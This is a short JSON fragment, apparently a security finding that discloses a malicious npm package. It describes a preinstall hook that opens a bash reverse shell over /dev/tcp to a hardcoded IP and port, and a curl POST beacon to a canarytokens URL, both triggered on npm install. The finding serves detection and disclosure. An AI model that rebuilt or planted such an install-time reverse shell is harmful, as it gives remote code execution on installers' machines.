  "summary": "preinstall reverse shell and HTTP beacon on npm install",
  "details": "package.json declares a preinstall script that runs `bash -i` with a redirection to /dev/tcp/147.93.157.202/8080, establishing an interactive reverse shell to a hardcoded remote host on `npm install`. The same one-liner pipes shell output through `curl -s -m 5 -X POST --data-binary @-` to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php, providing an independent plain-HTTP install-time beacon. Both actions fire automatically during the npm preinstall lifecycle hook with no user interaction and grant remote code execution on the installer's host.",
